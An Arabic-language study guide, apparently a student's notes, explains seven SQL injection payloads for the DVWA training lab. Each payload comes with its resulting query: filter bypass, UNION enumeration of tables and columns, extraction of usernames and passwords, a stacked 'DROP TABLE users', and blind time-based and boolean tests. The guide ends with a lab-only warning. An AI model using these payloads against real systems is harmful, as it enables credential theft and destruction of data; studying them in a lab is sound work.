---

# دليل شامل لحمولات SQL Injection في DVWA

**إعداد: طالب سنة أخيرة - هندسة البرمجيات**

هذا الملف يحتوي على ملخص شامل لأهم الحمولات (payloads) التي يتم استخدامها في اختبار ثغرات SQL Injection في بيئة DVWA (Damn Vulnerable Web Application)، وهي بيئة تعليمية آمنة لتجربة واختبار الهجمات البرمجية. الهدف من هذا الملف هو فهم كيفية عمل كل حمولة، وتفسير تأثيرها على الاستعلامات في قاعدة البيانات.

---

## 🧪 1. تجاوز التحقق باستخدام شرط منطقي دائم الصواب

**الحمولة:**

```sql
1' OR '1'='1' --
```

**الفكرة:**
هذه من أبسط الحمولات المستخدمة لتجاوز التحقق. بإضافة شرط `OR '1'='1'`، نضمن أن الشرط دائمًا صحيح وبالتالي نحصل على جميع السجلات.

**الاستعلام بعد الحقن:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1' --';
```

**النتيجة:**
عرض جميع المستخدمين بدلًا من مستخدم واحد فقط.

---

## 🧪 2. استعراض أسماء الجداول في قاعدة البيانات

**الحمولة:**

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

**الفكرة:**
باستخدام `UNION` مع جدول النظام `information_schema.tables` يمكننا الحصول على قائمة بأسماء جميع الجداول في قاعدة البيانات.

**الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT table_name, NULL FROM information_schema.tables --';
```

**النتيجة:**
كشف بنية قاعدة البيانات، وهي خطوة مهمة قبل الوصول إلى بيانات حساسة.

---

## 🧪 3. استخراج أسماء الأعمدة من جدول معين

**الحمولة:**

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

**الفكرة:**
بعد معرفة اسم الجدول (مثلًا `users`)، نستطيع تحديد أسماء أعمدته عبر `information_schema.columns`.

**الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --';
```

**النتيجة:**
معرفة الأعمدة التي تحتوي على معلومات حساسة مثل كلمات المرور أو الإيميلات.

---

## 🧪 4. استخراج بيانات المستخدمين (أسماء وكلمات مرور)

**الحمولة:**

```sql
' UNION SELECT user, password FROM users --
```

**الفكرة:**
بعد تحديد أسماء الأعمدة، نستطيع استخراج القيم مباشرة من الجدول.

**الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT user, password FROM users --';
```

**النتيجة:**
عرض بيانات المستخدمين، وهي واحدة من أخطر النتائج الممكنة لهجمات SQLi.

---

## 🧪 5. تنفيذ أوامر إضافية (Stacked Queries)

**الحمولة:**

```sql
1'; DROP TABLE users; --
```

**الفكرة:**
بعض محركات قواعد البيانات تدعم تنفيذ أكثر من استعلام في نفس الوقت. بهذه الطريقة يمكن إنهاء الاستعلام الأصلي وتشغيل استعلام ضار مثل حذف جدول.

**الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'; DROP TABLE users; --';
```

**النتيجة:**
حذف جدول كامل من قاعدة البيانات، وهذا يعتبر من أخطر أنواع الهجمات إذا كانت البيئة تسمح بذلك.

---

## 🧪 6. اختبار SQL Injection أعمى باستخدام تأخير زمني

**الحمولة:**

```sql
1' AND SLEEP(5) --
```

**الفكرة:**
إذا لم يكن بالإمكان عرض نتائج الاستعلام، يمكن اختبار الثغرة عن طريق تأخير التنفيذ. إذا لاحظنا تأخيرًا في استجابة الخادم، فهذا دليل على وجود ثغرة.

**الاستعلام الناتج:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND SLEEP(5) --';
```

**النتيجة:**
تأخير الاستجابة لخمس ثواني يثبت وجود ثغرة من نوع Time-Based Blind SQLi.

---

## 🧪 7. اختبار SQL Injection أعمى باستخدام شروط منطقية

**الحمولتان:**

```sql
1' AND 1=1 --
1' AND 1=2 --
```

**الفكرة:**
نجرّب شرطين، أحدهما دائم الصواب، والثاني دائم الخطأ. إذا ظهرت نتائج مع الأول ولم تظهر مع الثاني، نكون قد أثبتنا وجود ثغرة.

**الاستعلامات الناتجة:**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=1 --';
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 --';
```

**النتيجة:**
استجابة مختلفة بين الحالتين تعني وجود ثغرة SQLi حتى لو لم نرَ رسالة خطأ.

---

## ⚠️ تنبيه مهم

> هذا المشروع تدريبي فقط ولا يجوز استخدام الحمولات المذكورة خارج بيئة DVWA أو بدون تصريح واضح. كل استخدام غير قانوني أو أخلاقي لهذه التقنيات يُعرّض صاحبه للمسؤولية القانونية والمهنية.

---

هل ترغب أن أرسل لك هذا الملف بصيغة `README.md` الآن؟
